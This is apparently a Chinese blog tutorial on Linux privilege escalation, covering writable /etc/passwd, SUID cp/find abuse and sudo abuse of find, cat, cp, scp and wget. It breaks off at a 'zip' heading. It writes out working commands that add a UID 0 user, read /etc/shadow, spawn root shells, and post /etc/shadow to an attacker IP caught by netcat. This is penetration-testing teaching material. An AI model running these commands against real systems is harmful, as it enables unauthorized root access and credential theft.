@@ -1,0 +1,869 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="学习·记录·碎碎念·电子墓碑" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="学习·记录·碎碎念·电子墓碑" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="学习·记录·碎碎念·电子墓碑" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="penetration,权限提升,Linux" />
+
+
+<link rel="canonical" href="http://example.com/2025/01/10/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+
+
+  <title>
+Linux权限提升 |
+N1V = 学习·记录·碎碎念·电子墓碑</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Linux权限提升
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2025-01-10 00:00:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2025-01-10T00:00:00+08:00">2025-01-10</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">N1V</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="/2025/01/10/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/cover.png">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/10/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="N1U">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="学习·记录·碎碎念·电子墓碑">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="linux权限提升"><a class="anchor" href="#linux权限提升">#</a> Linux 权限提升</h1>
+<h2 id="1etcpasswd可写"><a class="anchor" href="#1etcpasswd可写">#</a> 1. <code>/etc/passwd</code>  可写</h2>
+<h3 id="1etcpasswd"><a class="anchor" href="#1etcpasswd">#</a> 1./etc/passwd</h3>
+<p><code>/etc/passwd</code>  文件是 Linux 和 Unix 系统中一个非常重要的配置文件，它存储了系统中所有用户的账户信息。虽然名字叫 “passwd”，但实际上这个文件并不直接存储用户的密码。/etc/shadow</p>
+<p>文件格式：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#/etc/passwd 文件的每一行代表一个用户账户，每一行包含七个以冒号 (:) 分隔的字段，格式如下：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token symbol">username</span><span class="token symbol">:password</span><span class="token operator">:</span><span class="token constant">UID</span><span class="token symbol">:GID</span><span class="token operator">:</span><span class="token constant">GECOS</span><span class="token symbol">:home_directory</span><span class="token operator">:</span>shell</pre></td></tr></table></figure><blockquote>
+<p><strong>username</strong>: 用户名。系统中唯一标识一个用户的名称，例如  <code>root</code> 、 <code>john</code> 。</p>
+<p><strong>password</strong>: 用户的加密密码。在现代系统中，这个字段通常只包含一个  <code>x</code> ，表示实际的密码存储在  <code>/etc/shadow</code>  文件中。</p>
+<p><strong>UID (User ID)</strong>: 用户 ID。每个用户都有一个唯一的用户 ID，例如 0 表示超级用户  <code>root</code> 。</p>
+<p><strong>GID (Group ID)</strong>: 组 ID。用户所属的组 ID。系统会在  <code>/etc/group</code>  文件中查找这个 GID 对应的组名。</p>
+<p><strong>GECOS (General Electric Comprehensive Operating System)</strong>: 通常包含用户的全名和其他信息，格式可以包括用户全名、办公室号码、电话号码等。这个字段可以是空的。</p>
+<p><strong>home_directory</strong>: 用户的主目录。当用户登录时，系统会将用户的工作目录设置为这个目录。</p>
+<p><strong>shell</strong>: 用户的登录 shell。当用户登录时，系统会启动这个 shell 进程。常见的 shell 有  <code>/bin/bash</code> 、 <code>/bin/sh</code> 、 <code>/bin/zsh</code>  等。</p>
+</blockquote>
+<p>举例：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>john<span class="token symbol">:x</span><span class="token operator">:</span><span class="token number">1001</span><span class="token operator">:</span><span class="token number">1001</span><span class="token symbol">:John</span> Doe<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>john<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr></table></figure><blockquote>
+<p><code>john</code> : 用户名</p>
+<p><code>x</code> : 密码（实际存储在 <code>/etc/shadow</code>  文件中）</p>
+<p><code>1001</code> : 用户 ID</p>
+<p><code>1001</code> : 组 ID</p>
+<p><code>John Doe,,,</code> : GECOS 字段，包含用户全名等信息</p>
+<p><code>/home/john</code> : 用户主目录</p>
+<p><code>/bin/bash</code> : 用户登录时启动的 shell</p>
+</blockquote>
+<p>以前，密码会直接存储在 <code>/etc/passwd</code>  文件中，但由于这个文件需要全局可读，因此存在安全风险。现在，实际的密码信息存储在 <code>/etc/shadow</code>  文件中，该文件只有超级用户和特定组可以读取。</p>
+<p><code>/etc/passwd</code>  文件中的密码字段用 <code>x</code>  代替，表示实际的密码存储在  <code>/etc/shadow</code>  文件中，但是如果 x 有具体数值的话，则将该数值当作密码。</p>
+<p><code>etc/passwd</code>  的正常权限为 644，即 -rw-r--r-- ，只允许所有者 (root) 进行编辑</p>
+<p><img data-src="image-20250114112310607.png" alt="image-20250114112310607"></p>
+<p>如果 <code>/etc/passwd</code>  文件设置为 &lt;u&gt;<strong> 任何用户可写</strong> &lt;/u&gt;，会带来严重的安全风险。</p>
+<p><strong>用户提升权限</strong>:</p>
+<ul>
+<li>
+<p>恶意用户可以修改自己的用户 ID（UID）为 0，从而提升为超级用户 root 的权限。例如：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>attacker<span class="token symbol">:x</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1001</span><span class="token symbol">:Attacker</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>attacker<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr></table></figure></li>
+</ul>
+<p><strong>添加恶意用户</strong>:</p>
+<ul>
+<li>
+<p>恶意用户可以添加新的用户账户，并赋予其高权限。例如：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>test1<span class="token symbol">:$1</span><span class="token variable">$WimKHrsx</span><span class="token variable">$kmwAZYfVgoOPH6BcnwzbO</span><span class="token operator">/</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token symbol">:root</span><span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr></table></figure></li>
+</ul>
+<h3 id="2操作"><a class="anchor" href="#2操作">#</a> 2. 操作</h3>
+<p>查看 /etc/passwd 权限</p>
+<pre><code>ls -l /etc/passwd
+</code></pre>
+<p><img data-src="image-20250114112331330.png" alt="image-20250114112331330"></p>
+<p>发现其他用户 (在这里是除了 root 和 root 组的用户) 可写，可添加一个拥有 root 的用户</p>
+<p>首先 <code>/etc/passwd</code>  的格式生成一个恶意用户 hacker</p>
+<p>通过 <code>openssl</code>  生成加密密码（密码为 hacker123）</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>openssl <span class="token function">passwd</span> hacker123</pre></td></tr><tr><td data-num="2"></td><td><pre>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> hacker123</pre></td></tr></table></figure><p><img data-src="image-20250114112347163.png" alt="image-20250114112347163"></p>
+<p>根据格式构造语句</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>hacker<span class="token symbol">:$1</span><span class="token variable">$D43eYIPF</span><span class="token variable">$EZPNTFTY9QniXu2</span><span class="token punctuation">.</span>BSAXa1<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token symbol">:root</span><span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token symbol">hacker</span><span class="token symbol">:$1</span><span class="token variable">$zsmp5dPt</span>$<span class="token number">2</span>Hl5Y9cm43e6OVLgzNHDl0<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">0</span><span class="token symbol">:root</span><span class="token operator">:</span><span class="token operator">/</span>root<span class="token operator">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</pre></td></tr></table></figure><p>将其输入到 <code>/etc/passwd</code></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'hacker:$1$D43eYIPF$EZPNTFTY9QniXu2.BSAXa1:0:0:root:/root:/bin/bash'</span> <span class="token operator">>></span> /etc/passwd</pre></td></tr></table></figure><p>再查看</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cat</span> /etc/passwd</pre></td></tr></table></figure><p><img data-src="image-20250114112359730.png" alt="image-20250114112359730"></p>
+<p>恶意用户已添加进来了，登录试试</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#切换用户 su &lt;username></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">su</span> hacker</pre></td></tr></table></figure><p><img data-src="image-20250114112409277.png" alt="image-20250114112409277"></p>
+<p>成功提权为 root 权限</p>
+<h2 id="2suid提权"><a class="anchor" href="#2suid提权">#</a> 2.SUID 提权</h2>
+<h3 id="1suid"><a class="anchor" href="#1suid">#</a> 1.SUID</h3>
+<p>SUID（Set User ID）是 Linux 和 Unix 系统中的一种特殊权限位，用于执行文件时更改进程的执行者用户 ID。设置了 SUID 位的可执行文件，当普通用户执行该文件时，会临时以文件所有者的权限运行，而不是以执行者本身的权限运行。</p>
+<p>这对于需要普通用户拥有某些超级用户权限的操作非常有用，但也需要谨慎使用以避免安全风险。</p>
+<p><strong>SUID 的表示方式</strong></p>
+<p>在文件权限中，SUID 位用字符 <code>'s'</code>  表示。可以通过以下方式查看文件的 SUID 位：</p>
+<ul>
+<li>
+<p>使用 <code>ls -l</code>  命令：</p>
+<pre><code class="language-BASH">ls -l /path/to/file
+</code></pre>
+<p>如果一个文件设置了 SUID 位，在文件的权限位中所有者的执行位（通常是第三个字符）会显示为 <code>s</code> 。例如：</p>
+<pre><code class="language-BASH">-rwsr-xr-x 1 root root 12345 Jul 13 12:34 /path/to/file
+</code></pre>
+<p>这里的 <code>s</code>  表示文件设置了 SUID 位。</p>
+</li>
+</ul>
+<p><strong>审计 SUID 文件</strong>：</p>
+<p>可以使用以下命令查找系统中所有设置了 SUID 位的文件：</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-perm</span> /4000 <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr></table></figure><p><strong>SUID 提权的原理</strong></p>
+<p>当一个可执行文件设置了 SUID 位，普通用户执行该文件时，程序会以文件所有者的权限运行而不是执行者本身的权限。通过这一特性，用户可以临时拥有文件所有者的权限。</p>
+<h3 id="2操作-2"><a class="anchor" href="#2操作-2">#</a> 2. 操作</h3>
+<h4 id="cp提权"><a class="anchor" href="#cp提权">#</a> <strong>——cp 提权</strong></h4>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查找设置了 SUID 位的文件</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token number">4000</span> <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr></table></figure><p>发现命令 cp 被设置了 SUID 位</p>
+<p><img data-src="image-20250114112422667.png" alt="image-20250114112422667"></p>
+<blockquote>
+<p>cp 命令主要用于复制文件或目录。</p>
+<p>cp [选项] 源文件 目标文件</p>
+</blockquote>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查看 cp 命令的所有者</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ls</span> <span class="token parameter variable">-l</span> /usr/bin/cp</pre></td></tr></table></figure><p><img data-src="image-20250114112431662.png" alt="image-20250114112431662"></p>
+<p>意味着我们虽然是普通用户，但可以以 root 的权限执行 cp 命令。</p>
+<p><strong>覆盖 /etc/passwd 提权</strong></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#将 /etc/passwd 输出到 passwd.txt，复制一份</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">cat</span> /etc/passwd <span class="token operator">></span> passwd.txt</pre></td></tr></table></figure><p>在 passwd.txt 中添加一个恶意用户</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'hacker2:$1$D43eYIPF$EZPNTFTY9QniXu2.BSAXa1:0:0:root:/root:/bin/bash'</span> <span class="token operator">>></span> passwd.txt</pre></td></tr></table></figure><p>再将该 <code>passwd.txt</code>  文件对  <code>/etc/passwd</code>  进行覆盖</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">cp</span> /home/lili/passwd.txt /etc/passwd</pre></td></tr></table></figure><p>再查看 <code>/etc/passwd</code> ，用户添加成功</p>
+<p><img data-src="image-20250114112442906.png" alt="image-20250114112442906"></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#切换用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">su</span> hacker2</pre></td></tr></table></figure><p><img data-src="image-20250114112457900.png" alt="image-20250114112457900"></p>
+<p>提权成功</p>
+<h4 id="find提权"><a class="anchor" href="#find提权">#</a> <strong>——find 提权</strong></h4>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查找 SUID 文件</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-perm</span> /4000 <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</pre></td></tr></table></figure><p><img data-src="image-20250114112511514.png" alt="image-20250114112511514"></p>
+<blockquote>
+<p>find 命令用于在指定目录下查找文件和目录</p>
+<p>-exec 参数用于对每个查找到的文件执行系统命令</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token number">644</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr></table></figure></blockquote>
+<p>所以我们可以利用其以 root 权限执行命令</p>
+<pre><code>find test -exec whoami \;
+</code></pre>
+<p>提权至 root</p>
+<h2 id="3-sudo提权"><a class="anchor" href="#3-sudo提权">#</a> 3. sudo 提权</h2>
+<h3 id="1etcsudoers"><a class="anchor" href="#1etcsudoers">#</a> 1./etc/sudoers</h3>
+<p><code>/etc/sudoers</code>  文件是 Linux 和 Unix 系统中用于配置 sudo 权限的配置文件。 <code>sudo</code>  是 &quot;superuser do&quot; 的缩写，它允许普通用户以其他用户（通常是超级用户）的身份执行命令。</p>
+<p><code>/etc/sudoers</code>  文件通过定义 &lt;u&gt; 哪些用户 &lt;/u &gt; 可以以 &lt; u &gt; 哪些身份 &lt;/u &gt; 执行 &lt; u &gt; 哪些命令 &lt;/u &gt; 来管理这些权限。</p>
+<p><strong>文件格式</strong></p>
+<p><code>/etc/sudoers</code>  文件中的每一行都定义了一条 sudo 规则，常见的语法格式如下：</p>
+<pre><code>user host=(runas_user) command
+</code></pre>
+<ul>
+<li><strong>user</strong>: 指定用户或用户组。用户组前加上 <code>%</code>  符号。</li>
+<li><strong>host</strong>: 指定允许用户使用 sudo 命令的主机名（通常用 ALL 表示所有主机）。</li>
+<li><strong>runas_user</strong>: 指定用户可以以哪个用户的身份运行命令（通常用 ALL 表示任何用户）。</li>
+<li><strong>command</strong>: 指定用户可以执行的命令（通常用 ALL 表示所有命令）。</li>
+</ul>
+<p><strong>示例</strong></p>
+<p>以下是一些典型的 <code>/etc/sudoers</code>  文件条目示例：</p>
+<ol>
+<li>
+<p><strong>允许用户 <code>john</code>  以 root 身份在任何主机上执行任何命令</strong>：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>john <span class="token constant">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">ALL</span><span class="token punctuation">)</span> <span class="token constant">ALL</span></pre></td></tr></table></figure></li>
+<li>
+<p><strong>允许用户组 <code>admin</code>  的所有成员以 root 身份在任何主机上执行任何命令</strong>：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">%</span>admin <span class="token constant">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">ALL</span><span class="token punctuation">)</span> <span class="token constant">ALL</span></pre></td></tr></table></figure></li>
+<li>
+<p><strong>允许用户 <code>jane</code>  在任何主机上以 root 身份重启系统</strong>：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>jane <span class="token constant">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">ALL</span><span class="token punctuation">)</span> <span class="token operator">/</span>sbin<span class="token operator">/</span>reboot</pre></td></tr></table></figure></li>
+<li>
+<p><strong>允许用户 <code>bob</code>  在任何主机上以任何用户身份执行网络相关的命令</strong>：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>bob <span class="token constant">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">ALL</span><span class="token punctuation">)</span> <span class="token operator">/</span>sbin<span class="token operator">/</span>ifconfig<span class="token punctuation">,</span> <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>netstat</pre></td></tr></table></figure></li>
+<li>
+<p><strong>禁止用户 <code>alice</code>  使用 sudo 命令</strong>：</p>
+<figure class="highlight ruby"><figcaption data-lang="ruby"></figcaption><table><tr><td data-num="1"></td><td><pre>alice <span class="token constant">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">ALL</span><span class="token punctuation">)</span> <span class="token operator">!</span><span class="token constant">ALL</span></pre></td></tr></table></figure></li>
+</ol>
+<p><strong> <code>sudo -l</code> </strong></p>
+<p>​	 <code>sudo -l</code>  是  <code>sudo</code>  命令的一个选项，用于列出当前用户或指定用户可以运行的命令，以及他们在使用  <code>sudo</code>  时的权限。这个命令非常有用，可以帮助用户了解他们的  <code>sudo</code>  权限，并确保配置正确。</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#查看当前用户的 sudo 权限</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token parameter variable">-l</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#查看用户 Alice 的 sudo 权限</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-U</span> Alice</pre></td></tr></table></figure><h3 id="2可以配合哪些命令提权呢"><a class="anchor" href="#2可以配合哪些命令提权呢">#</a> 2. 可以配合哪些命令提权呢？</h3>
+<h4 id="-find"><a class="anchor" href="#-find">#</a> - find</h4>
+<p>find 通常用来在 Linux 中寻找文件</p>
+<p>它也可以执行命令，比如:</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">find</span> /home <span class="token parameter variable">-exec</span> /bin/bash <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">find</span> /tmp <span class="token parameter variable">-exec</span> <span class="token string">"whoami"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">find</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-exec</span> <span class="token function">sh</span> <span class="token parameter variable">-c</span>  <span class="token string">"cat /etc/shadow"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token comment">#执行多命令</span></pre></td></tr></table></figure><h4 id="-cat"><a class="anchor" href="#-cat">#</a> - cat</h4>
+<p>cat 用来<strong>读</strong>系统文件，如果被赋予特殊权限的话，我们可以来查看一些特殊的高权限文件，比如 <code>/etc/shadow</code></p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">cat</span> /etc/shadow</pre></td></tr></table></figure><p>同时 <code>cat</code>  配合 <code>&gt;</code>  可以<strong>写</strong>入文件，据此我们可以修改配置文件，比如覆盖原本的 <code>/etc/passwd</code> （覆盖前最好备份，养成好习惯），达到添加用户的目的</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">cat</span> /tmp/passwd <span class="token operator">></span> /etc/passwd</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">cat</span> /tmp/newuser <span class="token operator">>></span> /etc/passwd</pre></td></tr></table></figure><h4 id="-cp"><a class="anchor" href="#-cp">#</a> - cp</h4>
+<p>cp 用来复制文件，如果被赋予特殊权限的话，我们同样可以用来读一些敏感文件，比如</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">cp</span> /etc/shadow /tmp/shadow</pre></td></tr></table></figure><p>也同样可以覆盖文件，比如添加用户</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">cp</span> /tmp/passwd /etc/passwd</pre></td></tr></table></figure><h4 id="-scp"><a class="anchor" href="#-scp">#</a> - scp</h4>
+<p>scp 命令允许在本地主机和远程主机之间或两个远程主机之间安全地传输文件，它基于 SSH 协议</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 从本地复制到远程</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">22</span> local_file.txt user@remote_host:/remote/directory/ </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 从远程复制到本地</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">22</span> user@remote_host:/remote/file.txt /local/directory/</pre></td></tr></table></figure><p>既然也能复制，那么也可以执行上面<strong>读取</strong>或<strong>覆盖</strong>敏感文件的操作。</p>
+<p>不仅如此， <code>scp</code>  有一个参数 <code>-S</code> ，用于指定传输文件时使用的远程 shell 程序</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp<span class="token variable">)</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'sh 0&lt;&amp;2 1>&amp;2'</span> <span class="token operator">></span> <span class="token variable">$TF</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> +x <span class="token string">"<span class="token variable">$TF</span>"</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-S</span> <span class="token variable">$TF</span> x y:</pre></td></tr></table></figure><p><img data-src="13.png" alt="img"></p>
+<h4 id="-wget"><a class="anchor" href="#-wget">#</a> - wget</h4>
+<p>wget 命令可以借助 HTTP、HTTPS 和 FTP 等多种协议从 Internet 或服务器同时下载单个或多个文件。在渗透过程中，我们经常使用它来下载工具，它也支持断点和恢复下载</p>
+<p>wget 可以利用  <code>post file</code>  选项发送任何文件的内容。所以，这里我们将使用 wget 命令来传输 /etc/shadow 文件的内容。</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> /usr/bin/wget --post-file<span class="token operator">=</span><span class="token operator">&lt;</span>path of file<span class="token operator">></span> <span class="token operator">&lt;</span>Listening IP<span class="token operator">></span></pre></td></tr></table></figure><p>如果想要把目标机器的  <code>shadow</code>  下载出来，可以这样做：</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#目标机器上</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">wget</span> --post-file<span class="token operator">=</span>/etc/shadoww <span class="token operator">&lt;</span>attack_ip<span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#攻击机上</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">80</span> <span class="token operator">></span> shadow</pre></td></tr></table></figure><h4 id="-zip"><a class="anchor" href="#-zip">#</a> - zip</h4>
